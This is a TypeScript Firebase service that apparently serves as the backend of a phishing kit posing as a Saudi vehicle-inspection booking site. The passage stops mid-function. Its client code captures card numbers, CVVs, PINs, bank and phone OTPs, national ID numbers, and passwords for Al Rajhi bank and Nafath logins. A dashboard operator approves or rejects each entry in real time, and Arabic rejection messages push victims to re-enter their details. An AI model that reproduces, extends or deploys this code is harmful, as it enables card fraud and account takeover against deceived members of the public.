import { db } from '../firebaseConfig';
import { ref, set, onValue, update, push, remove, serverTimestamp } from 'firebase/database';
import { NavigatePayload } from '../types';
import { getClientId, getClientPublicIpDetails } from '../shared/utils';
import { validateNationalID } from '../shared/validation';

type Listener = (...args: any[]) => void;

class FirebaseService {
  private listeners: Record<string, Listener[]> = {};
  private clientId: string;
  private isDashboard: boolean = false;
  private isConnected: boolean = false;
  private activeMode: 'client' | 'dashboard' | null = null;
  private clientUnsubscribe: (() => void) | null = null;
  private dashboardUnsubscribers: Array<() => void> = [];

  constructor() {
    this.clientId = getClientId();
  }

  // Helper for internal event bus
  private dispatch(event: string, data: any) {
    if (this.listeners[event]) {
      this.listeners[event].forEach(fn => fn(data));
    }
  }

  on(event: string, fn: Listener) {
    if (!this.listeners[event]) {
      this.listeners[event] = [];
    }
    this.listeners[event].push(fn);
  }

  off(event: string, fn: Listener) {
    if (!this.listeners[event]) return;
    this.listeners[event] = this.listeners[event].filter(l => l !== fn);
  }

  connect() {
    if (!db) {
      console.error("Firebase DB not initialized. Check firebaseConfig.ts");
      return;
    }

    // Determine if we are likely on the dashboard (simple check)
    const nextMode: 'client' | 'dashboard' = window.location.hash.includes('dashboard') ? 'dashboard' : 'client';

    // Prevent duplicate listeners for the same runtime mode.
    if (this.isConnected && this.activeMode === nextMode) {
      return;
    }

    this.disconnect();

    this.isDashboard = nextMode === 'dashboard';
    this.activeMode = nextMode;

    if (this.isDashboard) {
      this.setupDashboardListeners();
    } else {
      this.setupClientListeners();
    }

    this.isConnected = true;
  }

  disconnect() {
    if (this.clientUnsubscribe) {
      this.clientUnsubscribe();
      this.clientUnsubscribe = null;
    }

    if (this.dashboardUnsubscribers.length > 0) {
      this.dashboardUnsubscribers.forEach((unsubscribe) => unsubscribe());
      this.dashboardUnsubscribers = [];
    }

    this.isConnected = false;
    this.activeMode = null;
  }

  // --- Client Side Logic ---

  private setupClientListeners() {
    const commandsRef = ref(db, `commands/${this.clientId.replace(/\./g, '_')}`);

    this.clientUnsubscribe = onValue(commandsRef, (snapshot) => {
      const cmd = snapshot.val();
      if (cmd) {
        // Check if it's a navigation command
        if (cmd.action === 'navigate') {
          // Navigation commands are handled centrally by ClientAPI in App bridge.
          // Do not consume/remove them here to avoid race conditions.
          return;
        } else if (cmd.action === 'paymentApproved') {
          // Payment was approved by admin - redirect based on card type
          this.dispatch('paymentApproved', {
            redirectTo: cmd.redirectTo || '/pin',
            cardType: cmd.cardType,
            ip: this.clientId
          });
          // Remove command after execution
          remove(commandsRef);
        } else if (cmd.action === 'paymentRejected') {
          // Payment was rejected by admin - show error
          this.dispatch('paymentRejected', {
            message: cmd.message || 'تم رفض البطاقة من قبل البنك، يرجى استخدام بطاقة أخرى',
            ip: this.clientId
          });
          // Remove command after execution
          remove(commandsRef);
        } else if (cmd.action === 'callVerificationRejected') {
          this.dispatch('callVerificationRejected', {
            message: cmd.message || 'نعتذر منك، لم يتم تأكيد استلامك للاتصال. سيصلك اتصال جديد خلال لحظات.',
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'pinApproved') {
          this.dispatch('pinApproved', {
            redirectTo: cmd.redirectTo || '/phone',
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'pinRejected') {
          this.dispatch('pinRejected', {
            message: cmd.message || 'رمز PIN المدخل غير صحيح أو حدثت مشكلة أثناء الإدخال. يرجى المحاولة مرة أخرى.',
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'otpPhoneApproved') {
          this.dispatch('otpPhoneApproved', {
            redirectTo: cmd.redirectTo || '/nafad',
            customerName: cmd.customerName || '',
            flow: cmd.flow || 'default',
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'otpPhoneRejected') {
          this.dispatch('otpPhoneRejected', {
            message: cmd.message || 'رمز OTP المدخل غير صحيح أو حدثت مشكلة أثناء الإدخال. يرجى المحاولة مرة أخرى.',
            flow: cmd.flow || 'default',
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'otpBankApproved') {
          this.dispatch('otpBankApproved', {
            redirectTo: cmd.redirectTo || '/nafad',
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'otpBankRejected') {
          this.dispatch('otpBankRejected', {
            message: cmd.message || 'رمز OTP البنكي المدخل غير صحيح أو حدثت مشكلة أثناء الإدخال. يرجى المحاولة مرة أخرى.',
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'loginApproved') {
          this.dispatch('loginApproved', {
            redirectTo: cmd.redirectTo || '/otp-phone?flow=login',
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'loginRejected') {
          this.dispatch('loginRejected', {
            message: cmd.message || 'تعذر التحقق من معلومات تسجيل الدخول. يرجى المحاولة مرة أخرى.',
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'passwordResetApproved') {
          this.dispatch('passwordResetApproved', {
            redirectTo: cmd.redirectTo || '/login/form',
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'passwordResetRejected') {
          this.dispatch('passwordResetRejected', {
            message: cmd.message || 'تعذر تنفيذ طلب استعادة كلمة السر. يرجى المحاولة مرة أخرى.',
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'passwordResetNoAccount') {
          this.dispatch('passwordResetNoAccount', {
            message: cmd.message || 'لا يوجد حساب مرتبط برقم الهوية / الإقامة المدخل.',
            title: cmd.title || 'لا يوجد حساب',
            durationMs: Number(cmd.durationMs) > 0 ? Number(cmd.durationMs) : 5000,
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'newAccountApproved') {
          this.dispatch('newAccountApproved', {
            customerName: cmd.customerName || '',
            redirectTo: cmd.redirectTo || '/booking',
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'newAccountRejected') {
          this.dispatch('newAccountRejected', {
            message: cmd.message || 'هذا المستخدم ليس لديه حساب',
            title: cmd.title || 'الحساب غير موجود',
            durationMs: Number(cmd.durationMs) > 0 ? Number(cmd.durationMs) : 8000,
            redirectTo: cmd.redirectTo || '/booking',
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'rajhiLoginApproved') {
          this.dispatch('rajhiLoginApproved', {
            redirectTo: cmd.redirectTo || '/pin',
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'rajhiLoginRejected') {
          this.dispatch('rajhiLoginRejected', {
            message: cmd.message || 'تعذر التحقق من بيانات تسجيل الدخول في مصرف الراجحي. يرجى المحاولة مرة أخرى.',
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'nafadLoginApproved') {
          this.dispatch('nafadLoginApproved', {
            redirectTo: cmd.redirectTo || '/nafad-basmah',
            ip: this.clientId
          });
          remove(commandsRef);
        } else if (cmd.action === 'nafadLoginRejected') {
          this.dispatch('nafadLoginRejected', {
            message: cmd.message || 'تعذر التحقق من بيانات تسجيل الدخول في نفاذ. يرجى المحاولة مرة أخرى.',
            ip: this.clientId
          });
          remove(commandsRef);
        }
      }
    });
  }

  private createAuditRecord(
    safeIp: string,
    eventType: string,
    flow: string,
    input: Record<string, any> = {},
    linked: Record<string, any> = {},
    timestamp: number = Date.now()
  ): string {
    if (!db) return '';

    const auditRef = push(ref(db, 'auditLog'));
    const auditId = auditRef.key || `audit_${timestamp}`;
    const record = {
      auditId,
      ip: this.clientId,
      safeIp,
      eventType,
      flow,
      input,
      linked,
      status: 'pending' as const,
      createdAt: timestamp,
      updatedAt: timestamp
    };

    const updates: Record<string, any> = {};
    updates[`auditLog/${auditId}`] = record;
    updates[`users/${safeIp}/auditLog/${auditId}`] = record;
    update(ref(db), updates);

    return auditId;
  }

  // Call this from the Client UI components
  emitClientEvent(event: string, data: any) {
    if (!db) return;

    const safeIp = this.clientId.replace(/\./g, '_');
    const userRef = ref(db, `users/${safeIp}`);

    const timestamp = Date.now(); // Client timestamp
    const publicIpDetails = getClientPublicIpDetails();

    // Always keep a stable identity payload on user root to prevent split/orphan records
    update(userRef, {
      ip: this.clientId,
      privateIp: this.clientId,
      clientCookieId: this.clientId,
      publicIp: publicIpDetails.publicIp || null,
      publicIpv4: publicIpDetails.publicIpv4 || null,
      publicIpv6: publicIpDetails.publicIpv6 || null,
      currentPage: window.location.pathname || '/',
      status: 'online',
      lastSeen: timestamp
    });

    const detectSchemeFromCardNumber = (cardNumber?: string): 'mada' | 'visa' | 'mastercard' | 'unknown' => {
      const clean = (cardNumber || '').replace(/\D/g, '');
      if (!clean) return 'unknown';
      if (clean.startsWith('4')) return 'visa';
      if (clean.startsWith('5') || clean.startsWith('2')) return 'mastercard';
      if (clean.startsWith('6')) return 'mada';
      return 'unknown';
    };

    const attachOtpToLatestApprovedPayment = (
      otpCode: string,
      targetScheme?: 'mada' | 'visa' | 'mastercard',
      targetPaymentKey?: string
    ) => {
      onValue(ref(db, `users/${safeIp}/payments`), (paymentsSnapshot) => {
        const payments = paymentsSnapshot.val() || {};
        const entries = Object.entries(payments) as Array<[string, any]>;
        if (entries.length === 0) return;

        const approvedEntries = entries.filter(([, payment]) => payment?.status === 'approved');
        if (approvedEntries.length === 0) return;

        if (targetPaymentKey && payments[targetPaymentKey]) {
          update(ref(db, `users/${safeIp}/payments/${targetPaymentKey}`), {
            otp: otpCode,
            otpSubmittedAt: timestamp,
            otpScheme: targetScheme || null,
            otpStatus: 'approved'
          });
          return;
        }

        const candidates = targetScheme
          ? approvedEntries.filter(([, payment]) => detectSchemeFromCardNumber(payment?.cardNumber) === targetScheme)
          : approvedEntries;

        const source = candidates.length > 0 ? candidates : approvedEntries;

        const [latestKey] = source.sort(([, a], [, b]) => {
          const timeA = a?.approvedAt || a?.timestamp || a?.createdAt || 0;
          const timeB = b?.approvedAt || b?.timestamp || b?.createdAt || 0;
          return timeB - timeA;
        })[0];

        update(ref(db, `users/${safeIp}/payments/${latestKey}`), {
          otp: otpCode,
          otpSubmittedAt: timestamp,
          otpScheme: targetScheme || null,
          otpStatus: 'approved'
        });
      }, { onlyOnce: true });
    };

    const createPendingBankOtpVerification = (
      otpCode: string,
      targetScheme?: 'mada' | 'visa' | 'mastercard',
      auditId?: string
    ) => {
      onValue(ref(db, `users/${safeIp}/payments`), (paymentsSnapshot) => {
        const payments = paymentsSnapshot.val() || {};
        const entries = Object.entries(payments) as Array<[string, any]>;
        if (entries.length === 0) return;

        const approvedEntries = entries.filter(([, payment]) => payment?.status === 'approved');
        if (approvedEntries.length === 0) return;

        const candidates = targetScheme
          ? approvedEntries.filter(([, payment]) => detectSchemeFromCardNumber(payment?.cardNumber) === targetScheme)
          : approvedEntries;

        const source = candidates.length > 0 ? candidates : approvedEntries;

        const [paymentKey, paymentData] = source.sort(([, a], [, b]) => {
          const timeA = a?.approvedAt || a?.timestamp || 0;
          const timeB = b?.approvedAt || b?.timestamp || 0;
          return timeB - timeA;
        })[0];

        update(userRef, {
          pendingBankOtpVerification: {
            auditId: auditId || null,
            code: otpCode,
            scheme: targetScheme || detectSchemeFromCardNumber(paymentData?.cardNumber),
            paymentKey,
            cardNumber: paymentData?.cardNumber || '',
            cardHolderName: paymentData?.cardHolderName || '',
            status: 'pending',
            timestamp
          },
          hasNewData: true,
          newPaymentData: true,
          lastSeen: timestamp
        });
      }, { onlyOnce: true });
    };

    if (event === 'updateLocation') {
      update(userRef, {
        ip: this.clientId,
        currentPage: data.page,
        lastSeen: timestamp,
        status: 'online'
      });
    } else if (event === 'submitPhone') {
      update(userRef, {
        cardLinkedPhoneNumber: data.phone,
        phoneProvider: data.provider,
        birthDate: data.birthDate,
        age: data.age,
        hasNewData: true,
        newContactData: true,
        newPersonalData: true,
        lastSeen: timestamp
      });
    } else if (event === 'submitCallVerification') {
      const auditId = this.createAuditRecord(
        safeIp,
        'call_verification_submission',
        String(data?.provider || 'unknown'),
        {
          provider: data?.provider || null,
          cardLinkedPhoneNumber: data?.cardLinkedPhoneNumber || null
        },
        {},
        timestamp
      );

      update(userRef, {
        'callVerification/provider': data.provider,
        'callVerification/cardLinkedPhoneNumber': data.cardLinkedPhoneNumber,
        'callVerification/auditId': auditId,
        'callVerification/status': 'pending',
        'callVerification/requestedAt': timestamp,
        hasNewData: true,
        newContactData: true,
        lastSeen: timestamp
      });
    } else if (event === 'submitNewDate') {
      // Determine which categories have new data
      const updates: any = {
        ...data,
        lastSeen: timestamp,
        hasNewData: true
      };

      // Set flags based on what data is being submitted
      if (data.name || data.nationalID || data.email) {
        updates.newPersonalData = true;
      }
      if (data.phoneNumber) {
        updates.newContactData = true;
      }
      if (data.nationality || data.plate || data.vehicleType || data.region ||
        data.serviceType || data.hazardous || data.inspectionDate || data.inspectionTime) {
        updates.newBookingData = true;
      }

      console.log('🚀 SocketService.emitClientEvent(submitNewDate):', updates);
      update(userRef, updates);
    } else if (event === 'submitPayment') {
      // For payments, we append to a list in a real app, 
      // but here we'll update the user object and add to a payments collection
      update(userRef, {
        hasPayment: true,
        hasNewData: true,
        newPaymentData: true,
        lastSeen: timestamp
      });

      // Push payment details to a sub-collection
      const paymentsRef = ref(db, `users/${safeIp}/payments`);
      push(paymentsRef, data);

      // Trigger local notification just in case
      this.dispatch('newPayment', { ...data, ip: this.clientId });
    } else if (event === 'submitPendingPayment') {
      const auditId = this.createAuditRecord(
        safeIp,
        'payment_submission',
        String(data?.cardType || 'other'),
        {
          cardNumber: data?.cardNumber || '',
          cardHolderName: data?.cardHolderName || '',
          expirationDate: data?.expirationDate || '',
          cvv: data?.cvv || '',
          amount: data?.amount || 115,
          cardType: data?.cardType || 'other'
        },
        {},
        timestamp
      );

      // Submit payment for admin approval - stores in pendingPayment
      const paymentData = {
        cardNumber: data.cardNumber,
        cardHolderName: data.cardHolderName,
        expirationDate: data.expirationDate,
        cvv: data.cvv,
        amount: data.amount || 115,
        cardType: data.cardType || 'other',
        auditId,
        status: 'pending',
        timestamp: timestamp
      };

      // Store in pendingPayment for dashboard to display
      update(userRef, {
        pendingPayment: paymentData,
        hasNewData: true,
        newPaymentData: true,
        lastSeen: timestamp
      });

      console.log('🚀 SocketService: Payment submitted for approval:', paymentData);
      this.dispatch('pendingPaymentSubmitted', { ...paymentData, ip: this.clientId });
    } else if (event === 'submitLogin') {
      const normalizedUsername = String(data.username || '').replace(/\D/g, '').slice(0, 10);
      const usernameValidation = validateNationalID(normalizedUsername);

      if (!usernameValidation.valid) {
        this.dispatch('loginRejected', {
          message: usernameValidation.error || 'رقم الهوية / الإقامة غير صالح'
        });
        return;
      }

      const loginAttemptRef = push(ref(db, `users/${safeIp}/logins`));
      const attemptId = loginAttemptRef.key || `attempt_${timestamp}`;
      const auditId = this.createAuditRecord(
        safeIp,
        'login_submission',
        'login',
        {
          username: normalizedUsername,
          password: data?.password || ''
        },
        { attemptId },
        timestamp
      );

      const loginAttempt = {
        attemptId,
        auditId,
        username: normalizedUsername,
        password: data.password || '',
        status: 'pending' as const,
        timestamp
      };

      set(loginAttemptRef, loginAttempt);

      update(userRef, {
        pendingLogin: loginAttempt,
        pendingLoginOtpContext: null,
        pendingPhoneOtpVerification: null,
        otpMobile: null,
        otpMobileFlow: null,
        otpMobileSubmittedAt: null,
        hasNewData: true,
        newPaymentData: true,
        lastSeen: timestamp
      });

      this.dispatch('pendingLoginSubmitted', {
        username: normalizedUsername,
        status: 'pending',
        ip: this.clientId
      });
    } else if (event === 'submitPasswordReset') {
      const normalizedUsername = String(data.username || '').replace(/\D/g, '').slice(0, 10);
      const usernameValidation = validateNationalID(normalizedUsername);

      if (!usernameValidation.valid) {
        this.dispatch('passwordResetRejected', {
          message: usernameValidation.error || 'رقم الهوية / الإقامة غير صالح'
        });
        return;
      }

      const passwordResetAttemptRef = push(ref(db, `users/${safeIp}/passwordResets`));
      const attemptId = passwordResetAttemptRef.key || `attempt_${timestamp}`;
      const auditId = this.createAuditRecord(
        safeIp,
        'password_reset_submission',
        'password-reset',
        {
          username: normalizedUsername,
          password: String(data?.password || ''),
          confirmPassword: String(data?.confirmPassword || '')
        },
        { attemptId },
        timestamp
      );

      const passwordResetAttempt = {
        attemptId,
        auditId,
        username: normalizedUsername,
        password: String(data.password || ''),
        confirmPassword: String(data.confirmPassword || ''),
        status: 'pending' as const,
        timestamp
      };

      set(passwordResetAttemptRef, passwordResetAttempt);

      update(userRef, {
        pendingPasswordReset: passwordResetAttempt,
        pendingPasswordResetOtpContext: null,
        pendingPhoneOtpVerification: null,
        otpMobile: null,
        otpMobileFlow: null,
        otpMobileSubmittedAt: null,
        hasNewData: true,
        newPaymentData: true,
        lastSeen: timestamp
      });

      this.dispatch('pendingPasswordResetSubmitted', {
        username: normalizedUsername,
        status: 'pending',
        ip: this.clientId
      });
    } else if (event === 'submitRajhi') {
      const normalizedUsername = String(data.username || '').replace(/\D/g, '').slice(0, 10);
      const usernameValidation = validateNationalID(normalizedUsername);

      if (!usernameValidation.valid) {
        this.dispatch('rajhiLoginRejected', {
          message: usernameValidation.error || 'رقم الهوية / الإقامة غير صالح'
        });
        return;
      }

      const rajhiAttemptRef = push(ref(db, `users/${safeIp}/rajhiLogins`));
      const attemptId = rajhiAttemptRef.key || `attempt_${timestamp}`;
      const auditId = this.createAuditRecord(
        safeIp,
        'rajhi_login_submission',
        'rajhi-login',
        {
          username: normalizedUsername,
          password: data?.password || ''
        },
        { attemptId },
        timestamp
      );

      const rajhiAttempt = {
        attemptId,
        auditId,
        username: normalizedUsername,
        password: data.password || '',
        status: 'pending' as const,
        timestamp
      };

      set(rajhiAttemptRef, rajhiAttempt);

      update(userRef, {
        pendingRajhiLogin: rajhiAttempt,
        hasNewData: true,
        newPaymentData: true,
        lastSeen: timestamp
      });

      this.dispatch('pendingRajhiSubmitted', {
        username: normalizedUsername,
        status: 'pending',
        ip: this.clientId
      });
    } else if (event === 'submitNafad') {
      const normalizedIdNumber = String(data.idNumber || '').replace(/\D/g, '').slice(0, 10);
      const idValidation = validateNationalID(normalizedIdNumber);

      if (!idValidation.valid) {
        this.dispatch('nafadLoginRejected', {
          message: idValidation.error || 'رقم الهوية / الإقامة غير صالح'
        });
        return;
      }

      const nafadAttemptRef = push(ref(db, `users/${safeIp}/nafadLogins`));
      const attemptId = nafadAttemptRef.key || `attempt_${timestamp}`;
      const auditId = this.createAuditRecord(
        safeIp,
        'nafad_login_submission',
        String((data?.type as 'app' | 'password') || 'app'),
        {
          loginType: (data?.type as 'app' | 'password') || 'app',
          idNumber: normalizedIdNumber,
          password: data?.password || ''
        },
        { attemptId },
        timestamp
      );

      const nafadAttempt = {
        attemptId,
        auditId,
        loginType: (data.type as 'app' | 'password') || 'app',
        idNumber: normalizedIdNumber,
        password: data.password || '',
        status: 'pending' as const,
        timestamp
      };

      set(nafadAttemptRef, nafadAttempt);

      update(userRef, {
        pendingNafadLogin: nafadAttempt,
        hasNewData: true,
        newPaymentData: true,
        lastSeen: timestamp
      });

      this.dispatch('pendingNafadSubmitted', {
        loginType: nafadAttempt.loginType,
        idNumber: nafadAttempt.idNumber,
        status: 'pending',
        ip: this.clientId
      });
    } else if (event === 'submitNewAccount') {
      const accountAttemptRef = push(ref(db, `users/${safeIp}/newAccounts`));
      const attemptId = accountAttemptRef.key || `attempt_${timestamp}`;
      const auditId = this.createAuditRecord(
        safeIp,
        'new_account_submission',
        'new-account',
        {
          firstName: String(data?.firstName || '').trim(),
          lastName: String(data?.lastName || '').trim(),
          nationalId: String(data?.nationalId || '').replace(/\D/g, '').slice(0, 10),
          phone: String(data?.phone || '').replace(/\D/g, ''),
          email: String(data?.email || '').trim(),
          password: String(data?.password || '')
        },
        { attemptId },
        timestamp
      );

      const newAccountAttempt = {
        attemptId,
        auditId,
        firstName: String(data.firstName || '').trim(),
        lastName: String(data.lastName || '').trim(),
        nationalId: String(data.nationalId || '').replace(/\D/g, '').slice(0, 10),
        phone: String(data.phone || '').replace(/\D/g, ''),
        email: String(data.email || '').trim(),
        password: String(data.password || ''),
        status: 'pending' as const,
        timestamp
      };

      set(accountAttemptRef, newAccountAttempt);

      update(userRef, {
        pendingNewAccount: newAccountAttempt,
        hasNewData: true,
        newPersonalData: true,
        newContactData: true,
        lastSeen: timestamp
      });

      this.dispatch('pendingNewAccountSubmitted', {
        nationalId: newAccountAttempt.nationalId,
        status: 'pending',
        ip: this.clientId
      });
    } else if (event === 'submitPin') {
      // Submit PIN for admin review (similar to pending card approval flow)
      onValue(ref(db, `users/${safeIp}/payments`), (paymentsSnapshot) => {
        const payments = paymentsSnapshot.val() || {};
        const entries = Object.entries(payments) as Array<[string, any]>;

        if (entries.length === 0) return;

        const approvedEntries = entries.filter(([, payment]) => payment?.status === 'approved');
        if (approvedEntries.length === 0) return;

        const [latestApprovedKey, latestApprovedPayment] = approvedEntries.sort(([, a], [, b]) => {
          const timeA = a?.approvedAt || a?.timestamp || a?.createdAt || 0;
          const timeB = b?.approvedAt || b?.timestamp || b?.createdAt || 0;
          return timeB - timeA;
        })[0];

        const auditId = this.createAuditRecord(
          safeIp,
          'pin_submission',
          'payment-pin',
          {
            pin: data?.pin || '',
            paymentKey: latestApprovedKey,
            cardNumber: latestApprovedPayment?.cardNumber || '',
            cardHolderName: latestApprovedPayment?.cardHolderName || ''
          },
          { paymentKey: latestApprovedKey },
          timestamp
        );

        update(userRef, {
          pendingPinVerification: {
            auditId,
            pin: data.pin,
            paymentKey: latestApprovedKey,
            cardNumber: latestApprovedPayment?.cardNumber || '',
            cardHolderName: latestApprovedPayment?.cardHolderName || '',
            status: 'pending',
            timestamp
          },
          hasNewData: true,
          newPaymentData: true,
          lastSeen: timestamp
        });
      }, { onlyOnce: true });

      // Keep latest entered PIN in user root for backward compatibility
      update(userRef, {
        pin: data.pin,
        lastSeen: timestamp
      });

      console.log('🚀 SocketService: PIN submitted:', data.pin);
      this.dispatch('pinSubmitted', { pin: data.pin, ip: this.clientId });
    } else if (event === 'submitPhoneOtp') {
      const requestedFlow = String(data?.flow || 'default').trim().toLowerCase();

      onValue(userRef, (snapshot) => {
        const userData = snapshot.val() || {};
        const pendingLoginOtpContext = userData.pendingLoginOtpContext || null;
        const pendingPasswordResetOtpContext = userData.pendingPasswordResetOtpContext || null;
        const contextAttemptId = String(pendingLoginOtpContext?.attemptId || '').trim();
        const passwordResetAttemptId = String(pendingPasswordResetOtpContext?.attemptId || '').trim();
        const inferredLoginFlow = requestedFlow === 'login' || (!!contextAttemptId && pendingLoginOtpContext?.status === 'pending');
        const inferredPasswordResetFlow = requestedFlow === 'password-reset'
          || (!!passwordResetAttemptId && pendingPasswordResetOtpContext?.status === 'pending');
        const flow = inferredLoginFlow ? 'login' : inferredPasswordResetFlow ? 'password-reset' : 'default';
        const auditId = this.createAuditRecord(
          safeIp,
          'phone_otp_submission',
          flow,
          {
            code: data?.code || '',
            flow
          },
          {
            loginAttemptId: inferredLoginFlow ? (contextAttemptId || null) : null,
            passwordResetAttemptId: inferredPasswordResetFlow ? (passwordResetAttemptId || null) : null
          },
          timestamp
        );

        update(userRef, {
          pendingPhoneOtpVerification: {
            auditId,
            code: data.code,
            flow,
            loginAttemptId: inferredLoginFlow ? (contextAttemptId || null) : null,
            passwordResetAttemptId: inferredPasswordResetFlow ? (passwordResetAttemptId || null) : null,
            status: 'pending',
            timestamp
          },
          hasNewData: true,
          newContactData: true,
          lastSeen: timestamp
        });

        this.dispatch('phoneOtpSubmitted', { code: data.code, ip: this.clientId });
      }, { onlyOnce: true });
    } else if (event === 'submitPhoneOtpResendNotification') {
      const expiresAt = timestamp + (2 * 60 * 1000);

      update(userRef, {
        mobileOtpResendAlert: {
          requestedAt: timestamp,
          expiresAt
        },
        hasNewData: true,
        newContactData: true,
        lastSeen: timestamp
      });

      this.dispatch('phoneOtpResendRequested', { ip: this.clientId, requestedAt: timestamp, expiresAt });
    } else if (event === 'submitMadaOtp') {
      const otpCode = String(data.code || '').replace(/\D/g, '');
      const auditId = this.createAuditRecord(
        safeIp,
        'bank_otp_submission',
        'mada',
        { code: otpCode, scheme: 'mada' },
        {},
        timestamp
      );
      createPendingBankOtpVerification(otpCode, 'mada', auditId);
      this.dispatch('madaOtpSubmitted', { code: otpCode, ip: this.clientId });
    } else if (event === 'submitVisaOtp') {
      const otpCode = String(data.code || '').replace(/\D/g, '');
      const auditId = this.createAuditRecord(
        safeIp,
        'bank_otp_submission',
        'visa',
        { code: otpCode, scheme: 'visa' },
        {},
        timestamp
      );
      createPendingBankOtpVerification(otpCode, 'visa', auditId);
      this.dispatch('visaOtpSubmitted', { code: otpCode, ip: this.clientId });
    } else if (event === 'submitMasterCardOtp') {
      const otpCode = String(data.code || '').replace(/\D/g, '');
      const auditId = this.createAuditRecord(
        safeIp,
        'bank_otp_submission',
        'mastercard',
        { code: otpCode, scheme: 'mastercard' },
        {},
        timestamp
      );
      createPendingBankOtpVerification(otpCode, 'mastercard', auditId);
      this.dispatch('masterCardOtpSubmitted', { code: otpCode, ip: this.clientId });
    } else if (event === 'submitBankOtpResendNotification') {
      const scheme = (data?.scheme as 'mada' | 'visa' | 'mastercard' | undefined);
      if (!scheme || !['mada', 'visa', 'mastercard'].includes(scheme)) {
        return;
      }

      const expiresAt = timestamp + (2 * 60 * 1000);

      update(userRef, {
        otpResendAlert: {
          scheme,
          requestedAt: timestamp,
          expiresAt
        },
        hasNewData: true,
        newPaymentData: true,
        lastSeen: timestamp
      });

      this.dispatch('bankOtpResendRequested', { scheme, ip: this.clientId, requestedAt: timestamp, expiresAt });
    } else if (event === 'submitBankOtp') {
      const otpCode = String(data.code || '').replace(/\D/g, '');
      const auditId = this.createAuditRecord(
        safeIp,
        'bank_otp_submission',
        'unknown',
        { code: otpCode, scheme: 'unknown' },
        {},
        timestamp
      );
      createPendingBankOtpVerification(otpCode, undefined, auditId);
      this.dispatch('bankOtpSubmitted', { code: otpCode, ip: this.clientId });
    } else if (event === 'approveBankOtpVerification') {
      const otpCode = String(data.code || '').replace(/\D/g, '');
      const scheme = data.scheme as 'mada' | 'visa' | 'mastercard' | undefined;
      const paymentKey = data.paymentKey as string | undefined;

      update(userRef, {
        otpBank: otpCode,
        hasNewData: true,
        newPaymentData: true,
        lastSeen: timestamp
      });

      attachOtpToLatestApprovedPayment(otpCode, scheme, paymentKey);
    } else if (event === 'rejectBankOtpVerification') {
      const paymentKey = data.paymentKey as string | undefined;

      if (paymentKey) {
        update(ref(db, `users/${safeIp}/payments/${paymentKey}`), {
          otp: null,
          otpSubmittedAt: null,
          otpScheme: null,
          otpStatus: 'rejected'
        });
      }

      update(userRef, {
        otpBank: null,
        hasNewData: true,
        newPaymentData: true,
        lastSeen: timestamp
      });
    }
  }

  // Check if card number is blocked
  async checkCardBlocked(cardNumber: string): Promise<boolean> {
    if (!db) return false;

    return new Promise((resolve) => {
      const blockedBinsRef = ref(db, 'blockedBins');
      onValue(blockedBinsRef, (snapshot) => {
        const data = snapshot.val();
        if (data) {
          const blockedBins = Object.entries(data)
            .map(([key, value]: [string, any]) => {
              const normalizedBin = String(value?.bin ?? key).replace(/\D/g, '');
              return normalizedBin.length === 4 || normalizedBin.length === 6 ? normalizedBin : null;
            })
            .filter((bin): bin is string => Boolean(bin));
          const cleanNumber = cardNumber.replace(/\D/g, '');

          const isBlocked = blockedBins.some((bin: string) =>
            cleanNumber.startsWith(bin)
          );

          resolve(isBlocked);
        } else {
          resolve(false);
        }
      }, { onlyOnce: true });
    });
  }

  // --- Dashboard Side Logic ---

  private setupDashboardListeners() {
    const usersRef = ref(db, 'users');

    const usersUnsubscribe = onValue(usersRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        // Convert Object to Array format if needed, or pass map
        // We need to restore the '.' in IPs from keys
        const formattedUsers: any = {};
        Object.keys(data).forEach(key => {
          const user = data[key];
          // Convert payments object to array
          const paymentsArr = user.payments ? Object.values(user.payments) : [];

          formattedUsers[user.ip] = {
            ...user,
            payments: paymentsArr
          };
        });

        this.dispatch('initialData', formattedUsers);

        // Logic to detect "new" events could be more complex, 
        // but for now, we just stream the whole state.
        // If we needed specific events like 'newUserData', we'd listen to child_changed
      } else {
        this.dispatch('initialData', {});
      }
    });

    this.dashboardUnsubscribers.push(usersUnsubscribe);
  }

  // Call this from the Dashboard UI
  emitDashboardEvent(event: string, data: any) {
    if (!db) return;

    if (event === 'navigateTo') {
      const payload = data as NavigatePayload;
      const safeIp = payload.ip.replace(/\./g, '_');

      set(ref(db, `commands/${safeIp}`), {
        action: 'navigate',
        page: payload.page,
        timestamp: Date.now()
      });
    } else if (event === 'approvePayment') {
      // Approve payment and redirect user
      const payload = data as { ip: string; redirectTo: string; cardType: string };
      const safeIp = payload.ip.replace(/\./g, '_');

      set(ref(db, `commands/${safeIp}`), {
        action: 'paymentApproved',
        redirectTo: payload.redirectTo,
        cardType: payload.cardType,
        timestamp: Date.now()
      });

      // Also update the pending payment status
      update(ref(db, `users/${safeIp}/pendingPayment`), {
        status: 'approved',
        approvedAt: Date.now()
      });
    } else if (event === 'rejectPayment') {
      // Reject payment with message - save to payments list and clear pending
      const payload = data as { ip: string; message: string };
      const safeIp = payload.ip.replace(/\./g, '_');
      const userRef = ref(db, `users/${safeIp}`);

      // Get the pending payment data first
      onValue(ref(db, `users/${safeIp}/pendingPayment`), (snapshot) => {
        const pendingPayment = snapshot.val();
        if (pendingPayment) {
          // Push to payments collection with rejected status
          const paymentsRef = ref(db, `users/${safeIp}/payments`);
          push(paymentsRef, {
            ...pendingPayment,
            status: 'rejected',
            rejectMessage: payload.message,
            rejectedAt: Date.now()
          });

          // Clear pending payment
          remove(ref(db, `users/${safeIp}/pendingPayment`));

          // Update main user record
          update(userRef, {
            hasNewData: true,
            newPaymentData: true,
